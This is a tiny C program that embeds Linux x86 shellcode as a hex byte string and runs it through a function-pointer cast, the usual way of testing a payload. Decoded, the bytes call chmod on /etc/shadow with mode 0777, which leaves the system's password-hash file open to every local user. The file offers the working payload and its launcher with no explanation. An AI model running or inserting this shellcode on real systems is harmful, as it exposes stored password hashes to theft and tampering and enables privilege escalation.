#include <stdio.h>


unsigned char code[] = \
"\x31\xc0\x89\xc1\x68\x64\x6f\x77\x23\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x88\x44\x24\x0b\x89\xe3\x66\xb9\xff\x01\xb0\x0f\xcd\x80";

main() {
    printf("Shellcode length: %d bytes\n", sizeof(code));

    int (*ret)() = (int(*)())code;
    ret();
}